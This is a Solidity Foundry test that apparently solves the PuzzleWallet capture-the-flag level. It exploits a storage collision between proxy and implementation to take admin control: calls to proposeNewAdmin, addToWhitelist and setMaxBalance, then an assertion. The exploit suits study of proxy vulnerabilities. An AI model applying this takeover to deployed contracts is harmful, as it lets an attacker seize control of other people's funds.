// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {PuzzleWallet, PuzzleProxy} from "../src/PuzzleWallet.sol";

contract PuzzleWalletTest is Test {
    PuzzleWallet internal puzzleWallet;
    PuzzleProxy internal puzzleProxy;
    PuzzleWallet internal puzzleProxyAsWallet;
    address internal attacker;

    function setUp() public {
        attacker = address(0x1);
        puzzleWallet = new PuzzleWallet();
        bytes memory initData = abi.encodeWithSignature("init(uint256)", 100);
        puzzleProxy = new PuzzleProxy(address(this), address(puzzleWallet), initData);
        puzzleProxyAsWallet = PuzzleWallet(address(puzzleProxy));
    }

    function test_Attack() public {
        vm.startPrank(attacker);
        puzzleProxy.proposeNewAdmin(attacker);

        puzzleProxyAsWallet.addToWhitelist(attacker);
        puzzleProxyAsWallet.setMaxBalance(uint160(attacker));

        assertEq(puzzleProxy.admin(), attacker);

        vm.stopPrank();
    }
}
